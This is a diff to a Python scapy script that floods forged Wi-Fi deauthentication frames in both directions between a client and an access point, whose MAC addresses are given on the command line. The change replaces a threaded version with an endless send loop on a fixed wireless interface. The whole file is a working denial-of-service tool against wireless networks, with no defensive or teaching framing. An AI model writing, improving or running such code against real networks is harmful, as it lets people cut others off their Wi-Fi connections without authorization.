@@ -1,3 +1,4 @@
+from ast import While
 from scapy.all import *
 import os
 import sys
@@ -5,9 +6,11 @@ import sys
 ### Client MAC address
 from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11
 
-client = ""
+from multiprocessing import Process
+
+client = sys.argv[1]
 ### AP MAC address
-ap = ""
+ap = sys.argv[2]
 ### Interafce name 
 interface = "wlo1"
 
@@ -31,32 +34,9 @@ pkt_to_client = RadioTap() / dot11_to_client / Dot11Deauth(reason=1)
 ### Deauthentication packet from client to AP.
 pkt_to_ap = RadioTap() / dot11_to_ap / Dot11Deauth(reason=1)
 
-def client_to_ap():
-    while True:
-        print("Sending deauthentication packet from client to AP")
-        sendp(pkt_to_ap, inter=0.1, count=100, iface=interface, verbose=1)
-
-
-def ap_to_client():
-    while True:
-        print("Sending deauthentication packet from AP to client")
-        sendp(pkt_to_client, inter=0.1, count=100, iface=interface, verbose=1)
-
-    
-
-# count=100
-def start(client_mac, ap_mac):
-    global client
-    global ap 
-    
-    client = client_mac
-    ap = ap_mac
-    
-    deauth1 = Thread(tagert=ap_to_client)
-    deauth1.daemon = True
-    
-    deauth2 = Thread(target=client_to_ap)
-    deauth2.daemon = True
-    
-    deauth1.start()
-    deauth2.start()
+print("\n It may take a minute or 2 :) ... \n")   
+while True:
+    print("Sending deauthentication packet from AP to client")
+    sendp(pkt_to_client, inter=0.1, count=100, iface=interface, verbose=1)
+    print("Sending deauthentication packet from client to AP")
+    sendp(pkt_to_ap, inter=0.1, count=100, iface=interface, verbose=1)
